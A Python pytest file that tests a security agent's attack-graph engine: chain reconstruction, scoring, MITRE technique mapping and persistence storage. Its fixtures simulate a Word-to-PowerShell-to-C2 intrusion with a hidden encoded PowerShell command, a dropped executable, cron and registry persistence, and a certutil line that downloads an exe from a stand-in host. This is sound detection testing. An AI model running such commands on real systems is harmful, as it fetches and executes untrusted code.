from __future__ import annotations

from datetime import UTC, datetime, timedelta
from pathlib import Path

import pytest

from centralium.agent.graph import (
    InMemoryGraphAdapter,
    KuzuGraphAdapter,
    create_graph_adapter,
    mitre,
    predict_stage,
)
from centralium.agent.graph.core import REL_SCHEMA
from centralium.agent.interfaces import GraphAdapter
from centralium.agent.models import (
    AttackStage,
    EventType,
    Finding,
    FindingSource,
    Incident,
    NormalizedEvent,
    Severity,
)

T0 = datetime(2026, 1, 1, 12, 0, tzinfo=UTC)
TMP_EXE = "C:\\Users\\a\\AppData\\Local\\Temp\\upd.exe"


def ev(i: int, **kw) -> NormalizedEvent:
    return NormalizedEvent(event_id=f"e{i}", timestamp=T0 + timedelta(seconds=i), source="test", **kw)


def word_chain() -> list[NormalizedEvent]:
    """Word -> PowerShell -> download/drop exe -> run exe -> DNS -> C2 connect."""
    PS, PST = EventType.PROCESS_START, EventType
    return [
        ev(1, event_type=PS, pid=100, ppid=50, process_name="winword.exe", parent_process="explorer.exe", user="bob"),
        ev(2, event_type=PS, pid=200, ppid=100, process_name="powershell.exe", parent_process="winword.exe",
           command_line="powershell -nop -w hidden -enc AAAA", user="bob"),
        ev(3, event_type=PST.FILE_CREATE, pid=200, process_name="powershell.exe", file_path=TMP_EXE),
        ev(4, event_type=PS, pid=300, ppid=200, process_name="upd.exe", parent_process="powershell.exe",
           executable_path=TMP_EXE),
        ev(5, event_type=PST.DNS_QUERY, pid=300, process_name="upd.exe", domain="c2.evil.example",
           destination_ip="203.0.113.9"),
        ev(6, event_type=PST.NETWORK_CONNECT, pid=300, process_name="upd.exe", destination_ip="203.0.113.9",
           destination_port=443),
    ]  # fmt: skip


def benign_chain() -> list[NormalizedEvent]:
    PS = EventType.PROCESS_START
    return [
        ev(1, event_type=PS, pid=10, ppid=1, process_name="sshd", parent_process="systemd"),
        ev(2, event_type=PS, pid=20, ppid=10, process_name="bash", parent_process="sshd", user="alice"),
        ev(3, event_type=PS, pid=30, ppid=20, process_name="ls", parent_process="bash", user="alice"),
        ev(
            4,
            event_type=EventType.FILE_MODIFY,
            pid=20,
            process_name="bash",
            file_path="/home/alice/notes.txt",
        ),
    ]


@pytest.fixture(params=["memory", "kuzu"])
def graph(request, tmp_path: Path):
    g = create_graph_adapter(tmp_path / "g" if request.param == "kuzu" else None, batch_size=4)
    yield g
    g.close()


def feed(g, events, findings=None):
    sig = None
    for e in events:
        sig = g.ingest(e, (findings or {}).get(e.event_id, []))
    return sig


def test_adapters_satisfy_protocol(graph):
    assert isinstance(graph, GraphAdapter)


def test_attack_chain_reconstruction_word_to_c2(graph):
    sig = feed(graph, word_chain())
    text = "\n".join(sig.chain)
    for needle in ("winword.exe", "powershell.exe", "upd.exe", "c2.evil.example", "203.0.113.9"):
        assert needle in text
    # temporal order: chain lines after the path summary are time-sorted
    times = [line[:8] for line in sig.chain[1:]]
    assert times == sorted(times)
    assert sig.chain[0].startswith("path:")
    assert sig.score >= 70
    assert sig.attack_stage == AttackStage.COMMAND_AND_CONTROL
    assert 0 < sig.stage_confidence <= 0.9
    assert {"T1566.001", "T1059.001", "T1105", "T1204.002", "T1071.004"} <= set(sig.mitre_techniques)
    assert "e1" in sig.related_event_ids
    assert graph.chain_for("e6") == sig.chain


def test_benign_chain_scores_low_and_has_no_stage(graph):
    sig = feed(graph, benign_chain())
    assert sig.score <= 10
    assert sig.attack_stage is None
    assert sig.stage_confidence == 0.0


def test_score_is_deterministic_and_identical_across_backends(tmp_path):
    results = []
    for g in (InMemoryGraphAdapter(), InMemoryGraphAdapter(), create_graph_adapter(tmp_path / "k")):
        results.append(feed(g, word_chain()).model_dump())
        g.close()
    assert results[0] == results[1] == results[2]


def test_pid_reuse_creates_new_process_node():
    g = InMemoryGraphAdapter()
    PS = EventType.PROCESS_START
    g.ingest(ev(1, event_type=PS, pid=77, ppid=1, process_name="a"), [])
    g.ingest(ev(2, event_type=EventType.PROCESS_EXIT, pid=77, process_name="a"), [])
    g.ingest(ev(3, event_type=PS, pid=77, ppid=1, process_name="b"), [])
    procs = [n for n in g.nodes.values() if n.ntype == "Process" and n.label.endswith("(77)")]
    assert {n.label for n in procs} == {"a(77)", "b(77)"}


def test_all_required_node_and_relationship_types_created(tmp_path):
    g = create_graph_adapter(tmp_path / "g")
    PST = EventType
    evs = [
        *word_chain(),
        ev(7, event_type=PST.REGISTRY_MODIFY, pid=300, process_name="upd.exe",
           registry_key="HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\upd"),
        ev(8, event_type=PST.FILE_DELETE, pid=300, process_name="upd.exe", file_path="C:\\x.tmp"),
        ev(9, event_type=PST.FILE_MODIFY, pid=300, process_name="upd.exe", file_path="C:\\y.tmp"),
        ev(10, event_type=PST.AUTH, user="carol", host_id="h1"),
    ]  # fmt: skip
    feed(g, evs)
    inc = Incident(title="t", event_ids=["e6", "e7"], host_id="localhost")
    g.attach_incident(inc)
    counts = g.persisted_counts()
    for t in ("User", "Process", "File", "IP", "Domain", "RegistryKey", "Host", "Incident"):
        assert counts[t] > 0, t
    for rel in (
        "SPAWNED", "CREATED_FILE", "MODIFIED_FILE", "DELETED_FILE", "CONNECTED_TO", "RESOLVED", "RESOLVES_TO",
        "MODIFIED_REG", "AUTHENTICATED_AS", "PART_OF_INCIDENT",
    ):  # fmt: skip
        assert counts[rel] > 0, rel
    assert "CREATED_REG" in REL_SCHEMA
    g.close()


def test_persistence_is_represented_as_relationship_and_stage():
    g = InMemoryGraphAdapter()
    sig = g.ingest(
        ev(1, event_type=EventType.FILE_CREATE, pid=5, process_name="bash", file_path="/etc/cron.d/evil"), []
    )
    assert sig.attack_stage == AttackStage.PERSISTENCE
    assert any(e.etype == "CREATED_FILE" and e.props.get("persistence") for e in g.edges.values())
    assert "T1053.003" in sig.mitre_techniques


def test_persistence_survives_restart_and_cold_chain(tmp_path):
    path = tmp_path / "g"
    g = create_graph_adapter(path, batch_size=2)
    feed(g, word_chain())
    g.close()
    g2 = KuzuGraphAdapter(path, hydrate_window_sec=3600)
    assert g2.persisted_counts()["SPAWNED"] == 3
    assert any("c2.evil.example" in line for line in g2.chain_for("e6"))
    g2.close()
    g3 = KuzuGraphAdapter(path)
    g3.mem.events.clear()  # force the cold (storage) path
    assert any("203.0.113.9" in line for line in g3.chain_for("e5"))
    assert g3.stage_for("e6").current == AttackStage.COMMAND_AND_CONTROL
    g3.close()


def test_batched_writes_only_flush_at_batch_size(tmp_path):
    g = KuzuGraphAdapter(tmp_path / "g", batch_size=1000)
    feed(g, benign_chain())
    assert g.mem.pending_count() > 0  # buffered
    g.flush()
    assert g.mem.pending_count() == 0
    assert g.persisted_counts()["SPAWNED"] == 3
    g.close()


def test_failed_batch_is_requeued_not_lost(tmp_path):
    g = KuzuGraphAdapter(tmp_path / "g", batch_size=1000)
    feed(g, benign_chain())
    before = g.mem.pending_count()
    real = g._write

    def boom(*a, **k):
        raise RuntimeError("disk full")

    g._write = boom  # type: ignore[method-assign]
    with pytest.raises(RuntimeError):
        g.flush()
    assert g.mem.pending_count() == before
    g._write = real  # type: ignore[method-assign]
    g.flush()
    assert g.persisted_counts()["SPAWNED"] == 3
    g.close()


def test_hub_processes_do_not_merge_unrelated_chains():
    g = InMemoryGraphAdapter()
    PS = EventType.PROCESS_START
    g.ingest(ev(1, event_type=PS, pid=10, ppid=1, process_name="sshd", parent_process="systemd"), [])
    g.ingest(ev(2, event_type=PS, pid=20, ppid=10, process_name="bash", parent_process="sshd"), [])
    # unrelated, suspicious chain under the same hub parent
    bad = [
        ev(3, event_type=PS, pid=900, ppid=10, process_name="powershell.exe", parent_process="sshd",
           command_line="x -enc AAA"),
    ]  # fmt: skip
    g.ingest(bad[0], [])
    chain = g.chain_for("e2")
    assert not any("powershell" in line for line in chain)


def test_finding_stage_and_known_malicious_raise_score():
    g = InMemoryGraphAdapter()
    f = Finding(event_id="e1", source=FindingSource.YARA, rule_id="r", title="t", severity=Severity.CRITICAL,
                score=95, known_malicious=True, mitre_techniques=["T1486"])  # fmt: skip
    sig = g.ingest(
        ev(1, event_type=EventType.FILE_MODIFY, pid=4, process_name="x", file_path="/h/a.docx"), [f]
    )
    assert sig.attack_stage == AttackStage.IMPACT
    assert sig.score >= 40


def test_eviction_bounds_memory():
    g = InMemoryGraphAdapter(max_events=50)
    for i in range(300):
        g.ingest(
            ev(i, event_type=EventType.FILE_MODIFY, pid=1000 + i % 5, process_name="p", file_path=f"/f/{i}"),
            [],
        )
    assert len(g.events) == 50
    assert len(g.nodes) < 120


def test_idempotent_replay():
    g = InMemoryGraphAdapter()
    e = benign_chain()[1]
    g.ingest(e, [])
    n = g.stats()["edges"]
    g.ingest(e, [])
    assert g.stats()["edges"] == n


def test_stage_prediction_is_heuristic_and_capped():
    g = InMemoryGraphAdapter()
    feed(g, word_chain())
    pred = g.stage_for("e6")
    assert pred.current_confidence <= 0.9
    assert all(c <= 0.6 for _, c in pred.next_likely)
    assert AttackStage.COMMAND_AND_CONTROL not in [s for s, _ in pred.next_likely]  # already observed
    assert pred.next_likely  # exfil/collection/impact hints
    assert predict_stage([]).current is None


def test_mitre_helpers():
    assert mitre.lookup("t1059.001").name == "PowerShell"
    assert mitre.lookup("T9999") is None
    assert mitre.is_valid_id("T1059.001") and not mitre.is_valid_id("1059")
    assert mitre.stages_for("T1059.099") == mitre.stages_for("T1059")  # falls back to parent
    assert "T1486" in mitre.techniques_for_stage(AttackStage.IMPACT)
    assert ("T1105", AttackStage.COMMAND_AND_CONTROL) in mitre.map_command_line(
        "certutil -urlcache -f http://x/a.exe a.exe"
    )
    assert mitre.map_command_line("ls -la") == []
    assert "not in local table" in mitre.describe("T0000")
